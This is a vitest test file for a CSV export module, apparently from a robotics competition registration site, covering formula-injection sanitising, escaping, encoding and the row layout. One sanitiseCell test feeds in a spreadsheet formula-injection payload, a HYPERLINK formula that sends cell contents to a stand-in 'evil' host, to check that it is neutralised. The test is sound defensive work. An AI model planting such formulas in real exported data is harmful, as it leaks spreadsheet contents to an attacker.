import { describe, expect, it } from "vitest";
import {
  BOM,
  MEMBER_HEADERS,
  TEAM_HEADERS,
  TEAM_MEMBER_SLOTS,
  escapeCsvField,
  filsToAmount,
  memberRow,
  sanitiseCell,
  teamRow,
  toCsv,
} from "@/lib/csv";
import { MAX_TEAM_SIZE } from "@/lib/registration";

describe("sanitiseCell", () => {
  it("neutralises a value Excel would run as a formula", () => {
    // A team name is typed by the public, so this is reachable by anyone who
    // can register: without the apostrophe it executes when the sheet opens.
    expect(sanitiseCell('=HYPERLINK("http://evil/?"&A1)')).toBe(
      '\'=HYPERLINK("http://evil/?"&A1)',
    );
    expect(sanitiseCell("+962790000000")).toBe("'+962790000000");
    expect(sanitiseCell("-1+1")).toBe("'-1+1");
    expect(sanitiseCell("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("neutralises the whitespace variants Excel strips before parsing", () => {
    expect(sanitiseCell("\t=1+1")).toBe("'\t=1+1");
    expect(sanitiseCell("\r=1+1")).toBe("'\r=1+1");
  });

  it("leaves ordinary values completely alone", () => {
    expect(sanitiseCell("Maze Runners")).toBe("Maze Runners");
    expect(sanitiseCell("فريق الروبوت")).toBe("فريق الروبوت");
    expect(sanitiseCell("")).toBe("");
  });
});

describe("escapeCsvField", () => {
  it("quotes a value containing a comma, so it stays one column", () => {
    expect(escapeCsvField("Doe, John")).toBe('"Doe, John"');
  });

  it("doubles quotes rather than letting them end the field", () => {
    expect(escapeCsvField('He said "hi"')).toBe('"He said ""hi"""');
  });

  it("quotes newlines, so a motivation paragraph stays in its cell", () => {
    expect(escapeCsvField("line one\nline two")).toBe('"line one\nline two"');
  });

  it("quotes values whose spaces would otherwise be trimmed away", () => {
    expect(escapeCsvField("  padded  ")).toBe('"  padded  "');
  });

  it("writes an empty cell for null and undefined, not the word", () => {
    expect(escapeCsvField(null)).toBe("");
    expect(escapeCsvField(undefined)).toBe("");
  });

  it("writes dates in a form Excel reads as a date", () => {
    expect(escapeCsvField(new Date(Date.UTC(2026, 2, 14, 9, 30, 0)))).toBe("2026-03-14 09:30:00");
  });

  it("writes an empty cell for an invalid date rather than 'Invalid Date'", () => {
    expect(escapeCsvField(new Date("nonsense"))).toBe("");
  });

  it("writes booleans as words a reader understands", () => {
    expect(escapeCsvField(true)).toBe("yes");
    expect(escapeCsvField(false)).toBe("no");
  });

  it("leaves numbers unquoted, so they stay summable", () => {
    expect(escapeCsvField(35)).toBe("35");
    expect(escapeCsvField(0)).toBe("0");
  });
});

describe("toCsv", () => {
  it("leads with a byte-order mark, or Excel mangles every Arabic name", () => {
    const csv = toCsv(["Name"], [["فريق"]]);
    expect(csv.startsWith(BOM)).toBe(true);
    expect(BOM).toBe("﻿");
  });

  it("separates rows with CRLF and ends with one", () => {
    const csv = toCsv(["A", "B"], [[1, 2]]);
    expect(csv).toBe(`${BOM}A,B\r\n1,2\r\n`);
  });

  it("writes a header-only file when there is nothing to report", () => {
    expect(toCsv(["A"], [])).toBe(`${BOM}A\r\n`);
  });
});

describe("filsToAmount", () => {
  it("turns fils into a number that can be totalled in a column", () => {
    expect(filsToAmount(35_000)).toBe(35);
    expect(filsToAmount(15_500)).toBe(15.5);
  });

  it("passes absence through rather than reporting a fee of zero", () => {
    // A team with no quote yet is not a team quoted nothing.
    expect(filsToAmount(null)).toBeNull();
    expect(filsToAmount(undefined)).toBeNull();
  });
});

const REG = {
  teamName: "Maze Runners",
  submitterEmail: "lead@example.com",
  status: "CONFIRMED",
  memberCount: 2,
  feeTier: "IEEE_MEMBER",
  feeBaseFils: 25_000,
  feeDiscountFils: 5_000,
  feeDueFils: 20_000,
  paymentStatus: "VERIFIED",
  paymentAmountFils: 20_000,
  paymentReference: "CLIQ-1",
  paymentSubmittedAt: new Date(Date.UTC(2026, 1, 1)),
  paymentVerifiedAt: new Date(Date.UTC(2026, 1, 2)),
  paymentNote: "",
  paymentScreenshotUrl: "https://blob.example/x.png",
  consentVersion: "2026-08-25",
  consentAcceptedAt: new Date(Date.UTC(2026, 0, 31)),
  createdAt: new Date(Date.UTC(2026, 0, 31)),
};

const member = (order: number, first: string) => ({
  order,
  firstName: first,
  lastName: `Last${order}`,
  email: `${first.toLowerCase()}@example.com`,
  whatsapp: `+96279000000${order}`,
  university: "HTU",
  major: "Mechatronics",
  ieeeStatus: order === 1 ? "RAS_MEMBER" : "NON_MEMBER",
  ieeeMembershipId: `ID-${order}`,
});

describe("TEAM_MEMBER_SLOTS", () => {
  it("matches the largest team the site accepts", () => {
    // csv.ts cannot import registration.ts — that would drag Prisma and the
    // mail client into every consumer — so this is what stops the export
    // silently truncating a team if the limit is ever raised.
    expect(TEAM_MEMBER_SLOTS).toBe(MAX_TEAM_SIZE);
  });
});

describe("teamRow", () => {
  it("produces exactly one cell per header", () => {
    expect(teamRow(REG, [member(1, "Sara")])).toHaveLength(TEAM_HEADERS.length);
  });

  it("keeps the column count identical however many members a team has", () => {
    // A short team must not shift the fee columns left, or the sheet becomes
    // unreadable the moment anyone sorts it.
    const widths = [0, 1, 2, 3].map(
      (n) => teamRow(REG, [1, 2, 3].slice(0, n).map((i) => member(i, `M${i}`))).length,
    );
    expect(new Set(widths).size).toBe(1);
  });

  it("carries every member inline, in slot order", () => {
    const row = teamRow(REG, [member(1, "Sara"), member(2, "Omar"), member(3, "Lina")]);
    const at = (name: string) => row[TEAM_HEADERS.indexOf(name)];
    expect(at("Member 1 first name")).toBe("Sara");
    expect(at("Member 2 first name")).toBe("Omar");
    expect(at("Member 3 first name")).toBe("Lina");
  });

  it("sorts members rather than trusting the order they arrive in", () => {
    // "Member 1" must mean the person the team put first, however they were
    // fetched.
    const row = teamRow(REG, [member(3, "Lina"), member(1, "Sara"), member(2, "Omar")]);
    expect(row[TEAM_HEADERS.indexOf("Member 1 first name")]).toBe("Sara");
    expect(row[TEAM_HEADERS.indexOf("Member 3 first name")]).toBe("Lina");
  });

  it("carries each member's IEEE status and membership id", () => {
    const row = teamRow(REG, [member(1, "Sara"), member(2, "Omar")]);
    expect(row[TEAM_HEADERS.indexOf("Member 1 IEEE status")]).toBe("RAS_MEMBER");
    expect(row[TEAM_HEADERS.indexOf("Member 1 IEEE membership ID")]).toBe("ID-1");
    expect(row[TEAM_HEADERS.indexOf("Member 2 IEEE status")]).toBe("NON_MEMBER");
  });

  it("leaves unused member slots empty rather than absent", () => {
    const row = teamRow(REG, [member(1, "Sara")]);
    expect(row[TEAM_HEADERS.indexOf("Member 2 first name")]).toBeNull();
    expect(row[TEAM_HEADERS.indexOf("Member 3 IEEE membership ID")]).toBeNull();
  });

  it("writes an empty cell, not the word null, for an unused slot", () => {
    const csv = toCsv(TEAM_HEADERS, [teamRow(REG, [member(1, "Sara")])]);
    expect(csv).not.toContain("null");
  });

  it("reports the screenshot as a yes/no and never as its URL", () => {
    const row = teamRow(REG, []);
    expect(row).toContain(true);
    expect(row.some((cell) => String(cell).includes("blob.example"))).toBe(false);
  });

  it("never carries the resume code, which is a credential", () => {
    // Anyone holding it can reopen that team's registration and change it.
    const rendered = toCsv(TEAM_HEADERS, [teamRow(REG, [member(1, "Sara")])]);
    expect(rendered.toLowerCase()).not.toContain("resume");
  });

  it("reports money as numbers rather than formatted strings", () => {
    const row = teamRow(REG, []);
    expect(row).toContain(20);
    expect(row).toContain(5);
  });

  it("protects a member phone number from Excel's formula parser", () => {
    const csv = toCsv(TEAM_HEADERS, [teamRow(REG, [member(1, "Sara")])]);
    expect(csv).toContain("'+962790000001");
  });
});

describe("memberRow", () => {
  const MEMBER = {
    order: 1,
    firstName: "Sara",
    lastName: "Odeh",
    email: "sara@example.com",
    whatsapp: "+962790000000",
    university: "HTU",
    major: "Mechatronics",
    ieeeStatus: "RAS_MEMBER",
    ieeeMembershipId: "12345",
  };

  it("produces exactly one cell per header", () => {
    expect(memberRow("Maze Runners", "CONFIRMED", MEMBER)).toHaveLength(MEMBER_HEADERS.length);
  });

  it("repeats the team name and status, so the sheet stands alone", () => {
    const row = memberRow("Maze Runners", "CONFIRMED", MEMBER);
    expect(row[0]).toBe("Maze Runners");
    expect(row[1]).toBe("CONFIRMED");
  });

  it("uses the stored order as-is, which is already 1-based", () => {
    expect(memberRow("T", "PENDING", MEMBER)[2]).toBe(1);
  });

  it("escapes a phone number so Excel shows it instead of #NAME?", () => {
    const csv = toCsv(MEMBER_HEADERS, [memberRow("T", "PENDING", MEMBER)]);
    expect(csv).toContain("'+962790000000");
  });
});
